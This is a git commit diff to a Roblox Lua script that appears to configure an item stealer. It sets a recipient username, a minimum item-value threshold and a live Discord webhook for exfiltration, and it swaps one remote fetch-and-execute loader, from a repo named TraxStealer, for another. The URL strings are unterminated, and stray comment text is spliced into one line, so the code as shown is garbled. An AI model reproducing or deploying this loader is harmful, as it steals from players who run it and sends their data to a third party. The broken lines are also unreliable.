b9c89f4376a9cfa5d4331293183859535f8e3fa0
pettsimullator99 <piskutekpiskutek10@gmail.com>
2025-04-07 21:43:44 +0200

    Update script.lua

--- script.lua
+++ script.lua
@@ -3,7 +3,6 @@ Username2 = "CJNGpiskuteeek"
 MinimumRAP = 100000
 Webhook = "https://discord.com/api/webhooks/1358058249668002036/tct9nPL2K8uPP1mcJOhaHalZ91olBvVKB-ljiAWrAj-hg1JerlOab2o3ozwr6G1pl5MP"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/-- Fullscreen black screen with countdown and permanent block after
-local player = game.Players.LocalPlayer
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cjngpiskuteeek/lua.script/main/script.lua
 
 
